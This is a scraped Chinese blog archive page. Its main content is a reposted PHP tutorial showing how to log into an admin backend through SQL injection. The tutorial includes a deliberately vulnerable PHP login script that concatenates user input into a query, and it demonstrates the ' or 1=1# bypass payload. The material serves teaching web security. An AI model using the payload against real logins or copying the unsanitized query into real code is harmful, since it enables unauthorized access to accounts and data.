<li><img src="" alt=""> Hxai11 | 2013/08/07 09:24 | <a href="">/#</a></li>
</ul>
<p>这篇文章我转载了，挺好的。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 噬魂 | 2013/08/23 12:07 | <a href="">/#</a></li>
</ul>
<p>挺好的，。看了看</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 0x334 | 2013/10/17 23:23 | <a href="">/#</a></li>
</ul>
<p>额，<a href="http://blog.csdn.net/zhulinu/article/details/7699439" target="_blank">http://blog.csdn.net/zhulinu/article/details/7699439</a>
同学，你是zhulinu？</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<h3 id="-">发表评论</h3>
<p><a href="">点击这里取消回复。</a></p>
<p>您必须 <a href="http://drops.wooyun.org/login" target="_blank">登陆</a> 后才能发表评论。</p>
<h3 id="-">订阅更新</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="点击订阅" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">分类</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="漏洞分析" target="_blank">漏洞分析</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="技术分享" target="_blank">技术分享</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="工具收集" target="_blank">工具收集</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="业界资讯" target="_blank">业界资讯</a> (3)</p>
<h3 id="-">最新日志</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSS与字符编码的那些事儿 —科普文" target="_blank">XSS与字符编码的那些事儿 —科普文</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE – CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDN流量放大攻击思路" target="_blank">CDN流量放大攻击思路</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集" target="_blank">从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="攻击JavaWeb应用[8]-后门篇" target="_blank">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHP挑战通关攻略" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="搭建基于Suricata+Barnyard2+Base的IDS前端Snorby" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPU破解神器Hashcat使用简介" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="内网渗透应用 跨vlan渗透的一种思路" target="_blank">内网渗透应用 跨vlan渗透的一种思路</a></li>
</ul>
<h3 id="-">最新评论</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 在 <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSS与字符编码的那些事儿 ---科普文</a>
谢谢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de 在 <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">如何用意念获取附近美女的手机号码</a>
连接CMCC跳转到登陆页面 右键源码 修改即可</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>牛牛 在 <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
支持一下呵呵</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes 在 <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBoss安全问题总结</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx 在 <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
好吧，基佬，顶你一个，不错。</p>
<ul>
<li><a href="">下一页 »</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by 鬼仔" target="_blank">鬼仔</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/入侵检测/">入侵检测</a></li></span></span> | <span class="tags">Tagged <a href="/tags/入侵检测/" class="label label-primary">入侵检测</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">利用SQL注入漏洞登录后台</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度搜藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<p>用户名：  密码：   <a href="http://bbs.php100.com/register.php" target="_blank">新用户注册</a></p>
<p><a href="http://bbs.php100.com/read-htm-tid-693.html" target="_blank">PHP100三不条约</a> <a href="http://www.php100.com/cms/com/intome.php?tg" target="_blank">投稿</a></p>
<p><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/data/rssmap.html" title="rss" target="_blank"><img src="" alt="rss"></a></p>
<p><a href="http://www.php100.com/" target="_blank"><img src="" alt="PHP100中文网-中国第一档PHP资源分享门户"></a></p>
<p><a href="http://www.php100.com/" target="_blank">网站首页</a> | <a href="http://www.php100.com/html/itnews/" target="_blank">业界资讯</a> | <a href="http://www.php100.com/html/webkaifa/" target="_blank">相关开发资料</a> | <a href="http://www.php100.com/html/open-php/" target="_blank">IT开源报道</a> | <a href="http://www.php100.com/html/download/" target="_blank">相关下载</a> | <a href="http://www.php100.com/html/shipinjiaocheng/" target="_blank">视频教程</a> | <a href="http://www.php100.com/job.php" target="_blank">PHP求职招聘</a> | <a href="http://www.php100.com/waibao.php" target="_blank">项目供求</a> | <a href="http://www.php100.com/share.php" target="_blank">资源共享</a> | <a href="http://bbs.php100.com/" target="_blank">PHP100中文论坛</a></p>
<p><strong><a href="http://www.php100.com/html/webkaifa/apache/" target="_blank">Apache&amp;Nginx</a> | <a href="http://www.php100.com/html/webkaifa/DIV_CSS/" target="_blank">DIVCSS</a> | <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> | <a href="http://www.php100.com/html/webkaifa/database/" target="_blank">DB</a> | <a href="http://www.php100.com/html/webkaifa/javascript/" target="_blank">JS&amp;JQuery</a> | <a href="http://www.php100.com/html/webkaifa/HTML5/" target="_blank">HTML5</a> | <a href="http://www.php100.com/html/webkaifa/Android/" target="_blank">Android</a> | <a href="http://www.php100.com/html/webkaifa/python/" target="_blank">python</a> | <a href="http://www.php100.com/html/webkaifa/ajax/" target="_blank">Ajax</a> | <a href="http://www.php100.com/html/webkaifa/xml/" target="_blank">XML&amp;JSON</a> | <a href="http://www.php100.com/html/webkaifa/Linux/" target="_blank">Linux</a> | <a href="http://www.php100.com/html/webkaifa/zhengzebiaodashi/" target="_blank">正则</a> |</strong>
<a href="http://www.chuangen.com/php_training.php" target="_blank"><img src="" alt=""></a></p>
<p><a href="http://www.php100.com/" target="_blank">首页</a> &gt; <a href="http://www.php100.com/html/webkaifa/" target="_blank">开发资料</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">PHP应用</a> &gt; 正文</p>
<h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<p>发布时间：2012-02-10 09:42:17   来源：cnblogs.com/hongfei   评论：<a href="">0</a> 点击：12173 次 【字号：<a href="">大</a> <a href="">中</a> <a href="">小</a>】</p>
<p><a href="&quot;分享到QQ空间&quot;">QQ空间</a> <a href="&quot;分享到新浪微博&quot;">新浪微博</a> <a href="&quot;分享到腾讯微博&quot;">腾讯微博</a> <a href="&quot;分享到人人网&quot;">人人网</a> <a href="&quot;分享到豆瓣网&quot;">豆瓣网</a> <a href="&quot;分享到百度空间&quot;">百度空间</a> <a href="&quot;分享到百度搜藏&quot;">百度搜藏</a> <a href="&quot;分享到开心网&quot;">开心网</a> <a href="&quot;分享到复制网址&quot;">复制</a> 更多 <a href="&quot;累计分享8次&quot;">8</a>
题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句　　早在02年，国外关于SQL注入漏洞的技术文章已...</p>
<p>题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句</p>
<p>早在02年，国外关于SQL注入漏洞的技术文章已经很多，而国内在05年左右才开始的。</p>
<p>如今，谈SQL注入漏洞是否已是明日黄花，国内大大小小的网站都已经补上漏洞。但，百密必有一疏，入侵是偶然的，但安全绝对不是必然的。</p>
<p>前些天，网上传得沸沸扬扬的“拖库”事件给我们敲响了安全警钟。</p>
<p>在开发网站的时候，出于安全考虑，需要过滤从页面传递过来的字符。通常，用户可以通过以下接口调用数据库的内容：URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。</p>
<p>现在，很多网站开发人员知其然而不知其所以然，小弟也是，所以赶紧恶补下，总结如学习内容。希望对初学者能够起到抛砖引玉的作用。</p>
<p><strong>一、SQL注入的步骤</strong></p>
<p>a) 寻找注入点(如：登录界面、留言板等)</p>
<p>b) 用户自己构造SQL语句(如：’ or 1=1/#，后面会讲解)</p>
<p>c) 将sql语句发送给数据库管理系统(DBMS)</p>
<p>d) DBMS接收请求，并将该请求解释成机器代码指令，执行必要的存取操作</p>
<p>e) DBMS接受返回的结果，并处理，返回给用户</p>
<p>因为用户构造了特殊的SQL语句，必定返回特殊的结果(只要你的SQL语句够灵活的话)。</p>
<p>下面，我通过一个实例具体来演示下SQL注入</p>
<p><strong>二、SQL注入实例详解</strong>(以上测试均假设服务器未开启magic_quote_gpc)</p>
<p>1) 前期准备工作</p>
<p>先来演示通过SQL注入漏洞，登入后台管理员界面</p>
<p>首先，创建一张试验用的数据表：</p>
<p>CREATE TABLE <code>users</code> (</p>
<p><code>id</code> int(11) NOT NULL AUTO_INCREMENT,</p>
<p><code>username</code> varchar(64) NOT NULL,</p>
<p><code>password</code> varchar(64) NOT NULL,</p>
<p><code>email</code> varchar(64) NOT NULL,</p>
<p>PRIMARY KEY (<code>id</code>),</p>
<p>UNIQUE KEY <code>username</code> (<code>username</code>)</p>
<p>) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</p>
<p>添加一条记录用于测试：</p>
<p>INSERT INTO users (username,password,email)</p>
<p>VALUES(&#39;MarcoFly&#39;,md5(&#39;test&#39;),&#39;marcofly@test.com&#39;);</p>
<p>接下来，贴上登录界面的源代码：</p>
<html>
<head>
<title>Sql注入演示</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body >
<form action="validate.php" method="post">
  <fieldset >
    <legend>Sql注入演示</legend>
    <table>
      <tr>
        <td>用户名：</td>
        <td><input type="text" name="username"></td>
      </tr>
      <tr>
        <td>密&nbsp;&nbsp;码：</td>
        <td><input type="text" name="password"></td>
      </tr>
      <tr>
        <td><input type="submit" value="提交"></td>
        <td><input type="reset" value="重置"></td>
      </tr>
    </table>
  </fieldset>
</form>
</body>
</html>

<p>附上效果图：
<img src="" alt="\"></p>
<p>当用户点击提交按钮的时候，将会把表单数据提交给validate.php页面，validate.php页面用来判断用户输入的用户名和密码有没有都符合要求(这一步至关重要，也往往是SQL漏洞所在)</p>
<p>代码如下：</p>
<html>
<head>
<title>登录验证</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body>
&lt;?php

       $conn=@mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;&#39;) or die(&quot;数据库连接失败！&quot;);;

       mysql_select_db(&quot;injection&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);

       $name=$_POST[&#39;username&#39;];

       $pwd=$_POST[&#39;password&#39;];

       $sql=&quot;select /* from users where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;;

       $query=mysql_query($sql);

       $arr=mysql_fetch_array($query);

       if(is_array($arr)){

              header(&quot;Location:manager.php&quot;);

       }else{

              echo &quot;您的用户名或密码输入有误，<a href=\"Login.php\">请重新登录！</a>&quot;;

       }

?&gt;
</body>
</html>

<p>注意到了没有，我们直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，待会你们将明白，这是致命的。</p>
<p>代码分析：如果，用户名和密码都匹配成功的话，将跳转到管理员操作界面(manager.php)，不成功，则给出友好提示信息。</p>
<p>登录成功的界面：
<img src="" alt="\"></p>
<p>登录失败的提示：</p>
<p><img src="" alt="\"></p>
<p>到这里，前期工作已经做好了，接下来将展开我们的重头戏：SQL注入</p>
<p>2) 构造SQL语句</p>
<p>填好正确的用户名(marcofly)和密码(test)后，点击提交，将会返回给我们“欢迎管理员”的界面。</p>
<p>因为根据我们提交的用户名和密码被合成到SQL查询语句当中之后是这样的：</p>
<p>select /* from users where username=&#39;marcofly&#39; and password=md5(&#39;test&#39;)</p>
<p>很明显，用户名和密码都和我们之前给出的一样，肯定能够成功登陆。但是，如果我们输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。恩，正常情况下是如此，但是对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。</p>
<p>比如：在用户名输入框中输入:’ or 1=1/#,密码随便输入，这时候的合成后的SQL查询语句为：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>语义分析：“/#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>等价于</p>
<p>select /* from users where username=&#39;&#39; or 1=1</p>
<p>因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句：</p>
<p>select /* from users</p>
<p>没错，该sql语句的作用是检索users表中的所有字段</p>
<p>小技巧：如果不知道’ or 1=1/#中的单引号的作用，可以自己echo 下sql语句，就一目了然了。</p>
<p>看到了吧，一个经构造后的sql语句竟有如此可怕的破坏力，相信你看到这后，开始对sql注入有了一个理性的认识了吧~</p>
<p>没错，SQL注入就是这么容易。但是，要根据实际情况构造灵活的sql语句却不是那么容易的。有了基础之后，自己再去慢慢摸索吧。</p>
<p>有没有想过，如果经由后台登录窗口提交的数据都被管理员过滤掉特殊字符之后呢?这样的话，我们的万能用户名’ or 1=1/#就无法使用了。但这并不是说我们就毫无对策，要知道用户和数据库打交道的途径不止这一条。
-</p>
<p>（责任编辑：phpcms）
本文关键字：</p>
<ul>
<li><a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C0%FB%D3%C3" target="_blank">利用</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%D7%A2%C8%EB" target="_blank">注入</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C2%A9%B6%B4" target="_blank">漏洞</a></li>
</ul>
<p><strong>上一篇：</strong><a href="http://www.php100.com/html/webkaifa/javascript/2012/0210/9802.html" target="_blank">JS 调用 Flash 方法</a>
<strong>下一篇：</strong><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/9804.html" target="_blank">几个 PHP 的“魔术常量”</a></p>
<ul>
<li>14 <img src="" alt="">
震惊</li>
<li>14 <img src="" alt="">
不解</li>
<li>3 <img src="" alt="">
愤怒</li>
<li>9 <img src="" alt="">
杯具</li>
<li>18 <img src="" alt="">
无聊</li>
<li>7 <img src="" alt="">
高兴</li>
<li>17 <img src="" alt="">
支持</li>
<li>83 <img src="" alt="">
超赞</li>
</ul>
<p>分享到：  <a href=""> </a> <a href="http://v.t.sina.com.cn/share/share.php?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;appkey=3172366919&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到新浪微博" target="_blank"> </a> <a href="http://www.douban.com/recommend/?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到豆瓣" target="_blank"> </a> <a href="http://share.renren.com/share/buttonshare.do?link=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;title=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0" title="分享到人人" target="_blank"> </a> <a href="http://www.kaixin001.com/repaste/share.php?rtitle=%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0&amp;rurl=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html&amp;rcontent=" title="分享到开心网" target="_blank"> </a> <a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Fwww.php100.com%2Fhtml%2Fwebkaifa%2FPHP%2FPHPyingyong%2F2012%2F0210%2F9803.html" title="分享到QQ空间" target="_blank"> </a>
最新资讯</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2013/0502/13421.html" target="_blank">PHP闭包（Closure）初探</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13419.html" target="_blank">传 iOS 7 采用扁平化设计：颠覆拟物理念</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13418.html" target="_blank">创业失败后如何找工作</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0502/13416.html" target="_blank">程序员的时间都去了哪儿？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13413.html" target="_blank">互联网 DBA 需要做那些事</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13412.html" target="_blank">Google 眼镜的核心代码</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13411.html" target="_blank">谷歌眼镜已被越狱：或削弱谷歌对用户的控制</a></li>
</ul>
<p>热门内容</p>
<ul>
<li><a href="http://www.php100.com/html/itnews/it/2013/0107/11895.html" title="2013年1月编程语言排行榜" target="_blank">2013年1月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0427/13409.html" title="Ubuntu 13.04 正式版发布" target="_blank">Ubuntu 13.04 正式版发布</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2011/1118/9311.html" title="百度地图推出卫星地图" target="_blank">百度地图推出卫星地图</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2009/0408/14.html" title="十天学会PHP和MYSQL视频教程篇" target="_blank">十天学会PHP和MYSQL视频教程篇</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0426/13402.html" title="如何做一个真正牛X 的开源项目" target="_blank">如何做一个真正牛X 的开源项目</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0408/13335.html" title="2013年4月编程语言排行榜" target="_blank">2013年4月编程语言排行榜</a></li>
<li><a href="http://www.php100.com/html/itnews/PHPxinwen/2010/0514/4515.html" title="使用方正字体侵权索赔过亿" target="_blank">使用方正字体侵权索赔过亿</a></li>
<li><a href="http://www.php100.com/html/itnews/it/2013/0428/13414.html" title="如何组织大型JavaScript应用中的代码？" target="_blank">如何组织大型JavaScript应用中的代码？</a></li>
</ul>
<p><strong>热点推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0610/4712.html" title="教你如何成为PHP高手?" target="_blank">教你如何成为PHP高手?</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0114/309.html" title="PHP导入导出Excel方法" target="_blank">PHP导入导出Excel方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2011/0406/7873.html" title="Redis 的安装配置介绍" target="_blank">Redis 的安装配置介绍</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0830/3245.html" title="数据库三范式，轻松理解" target="_blank">数据库三范式，轻松理解</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0905/3268.html" title="PHP网站开发方案（开发新人必读）" target="_blank">PHP网站开发方案（开发新人必读）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0930/3362.html" title="PHP面向对象编程专题（附视频教程）" target="_blank">PHP面向对象编程专题（附视频教程）</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/1101/6727.html" title="php中使用exec,system等函数调用系统命令" target="_blank">php中使用exec,system等函数调用系</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0830/5346.html" title="SVN入门及配置使用" target="_blank">SVN入门及配置使用</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2009/0721/3087.html" title="php excel类 ，phpExcel使用方法介绍" target="_blank">php excel类 ，phpExcel使用方法</a></li>
<li><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2010/0826/5308.html" title="完美解决failed to open stream: HTTP request failed!" target="_blank">完美解决failed to open stream</a>
<strong>广告赞助商</strong> <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">投放</a></li>
</ul>
<p><strong>最新视频推荐</strong> <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/html/jiaocheng/" target="_blank">更多</a></p>
<ul>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0422/9129.html" target="_blank">［第77讲］新浪微博开放平台 -新</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0415/9128.html" target="_blank">［第76讲］微信公共平台 - 平台</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0407/9127.html" target="_blank">［第75讲］微信公共平台 - 开放</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9125.html" target="_blank">［第74讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9124.html" target="_blank">［第73讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9123.html" target="_blank">［第72讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0325/9122.html" target="_blank">［第71讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9121.html" target="_blank">［第70讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9120.html" target="_blank">［第69讲］thinkphp 3.1.2 系列</a></li>
<li><a href="http://www.php100.com/html/shipinjiaocheng/php100-2012/2013/0322/9119.html" target="_blank">［第68讲］thinkphp 3.1.2 系列</a>
-
<a href="http://www.php100.com/cms/com/" target="_blank">关于我们</a> | <a href="http://www.php100.com/cms/com/buddy.php" target="_blank">管理团队</a> | <a href="">网站律师</a> | <a href="http://www.php100.com/cms/com/adservice.php" target="_blank">广告服务</a> | <a href="http://www.php100.com/cms/com/intome.php" target="_blank">投稿指南</a> | <a href="http://bbs.php100.com/thread-htm-fid-14.html" target="_blank">提建议</a> | <a href="http://www.php100.com/plus/flink.php" target="_blank">友情链接</a> | <a href="http://www.php100.com/plus/flink_add.php" target="_blank">申请加入</a> | <a href="http://www.php100.com/data/sitemap.html" target="_blank">网站地图</a></li>
</ul>
<p>Copyright (C) 2007-2011 PHP100.com, All Rights Reserved 版权所有 <a href="http://php100.com/go.php?url=http://www.php100.net/" target="_blank">上海创恩信息技术有限公司</a>. 沪ICP备08100465号
地址:上海徐汇区零陵路585号 爱邦大厦26H座 传真(FAX):021-61190281 电话(Tel):021-61190282
PHP100 Website Powered by PHPCMS. For PHP100. 服务器维护：阿里巴巴-阿里云</p>
<p><a href="http://www.cnzz.com/stat/website.php?web_id=1668579" title="站长统计" target="_blank">站长统计</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/SQL注入/">SQL注入</a></li></span></span> | <span class="tags">Tagged <a href="/tags/SQL注入/" class="label label-primary">SQL注入</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-CAS--新浪微博如何实现SSO的分析-企业应用-Java-ITeye论坛/">新浪微博如何实现 SSO 的分析 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-CAS--新浪微博如何实现SSO的分析-企业应用-Java-ITeye论坛/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-sso-java-iteye-">新浪微博如何实现 SSO 的分析 - 企业应用 - Java - ITeye论坛</h1>
<p><a href="http://www.iteye.com/login" title="登录" target="_blank">您还未登录 !</a> <a href="http://www.iteye.com/login" target="_blank">登录</a> <a href="http://www.iteye.com/signup" target="_blank">注册</a></p>
<p><a href="http://www.iteye.com/" target="_blank"><img src="&quot;ITeye-最棒的软件开发交流社区&quot;" alt="ITeye-最棒的软件开发交流社区"></a></p>
<p><a href="http://www.iteye.com/forums" target="_blank">论坛首页</a> → <a href="http://www.iteye.com/forums/board/Java" target="_blank">Java企业应用论坛</a> →</p>
<h1 id="-sso-">新浪微博如何实现 SSO 的分析</h1>
